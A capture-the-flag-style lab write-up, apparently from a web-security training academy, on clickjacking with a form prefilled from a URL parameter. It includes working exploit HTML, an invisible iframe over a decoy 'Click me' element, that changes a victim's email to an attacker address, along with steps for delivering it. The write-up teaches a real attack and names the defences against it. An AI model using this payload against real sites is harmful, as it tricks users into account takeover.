# Clickjacking with Form Input Data Prefilled from a URL Parameter

**Difficulty:** Apprentice  
**Vulnerability:** Clickjacking (UI Redressing)  
**Topic:** Clickjacking with Prefilled Form Input  
**Status:** Solved ✅

## Overview

This lab demonstrates how clickjacking can be combined with URL parameter-based form prepopulation to trick a victim into submitting an unintended change.

The application contains an email update feature. By embedding the account page inside an iframe and supplying a specially crafted URL parameter, an attacker can prepopulate the email field with an address under their control.

The victim is then tricked into clicking a decoy element that is positioned over the legitimate Update email button.

## Methodology

### 1. Login to the application

Logged in using the provided credentials:

- **Username:** `wiener`
- **Password:** `peter`

Navigated to the My Account page and identified the email update form.

### 2. Identify the URL parameter

Observed that the application accepts an `email` parameter in the URL.

Used this functionality to prepopulate the email field with an attacker-controlled address.

### 3. Construct the clickjacking exploit

Navigated to the exploit server and inserted the following HTML into the Body section:

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

### 4. Align the decoy element

Initially set the iframe opacity to `0.1` to make the underlying account page visible.

Adjusted the `top` and `left` CSS properties until the decoy text aligned with the **Update email** button.

After confirming the alignment, changed the iframe opacity to `0.0001` to make it almost completely transparent.

### 5. Deliver the exploit

Changed the decoy text to **Click me**, stored the exploit, and selected **Deliver exploit to victim**.

The victim's click triggered the underlying Update email button, submitting the prepopulated email address.

### 6. Verify the result

The lab displayed the **Solved** status.

## Key Takeaways

- Clickjacking can be combined with URL parameter-based form prepopulation.
- Attackers can manipulate legitimate forms through specially crafted iframe URLs.
- A victim's authenticated session can be used to submit unintended actions.
- CSRF protection alone does not prevent clickjacking.
- CSS positioning, opacity, and stacking order are important when constructing clickjacking exploits.
- The `frame-ancestors` CSP directive and `X-Frame-Options` header help prevent unauthorized framing.

## Conclusion

Successfully exploited a clickjacking vulnerability by prepopulating an email update form through a URL parameter and overlaying it with a deceptive element.

This demonstrated how combining UI redressing with attacker-controlled form input can manipulate users into submitting unintended account changes.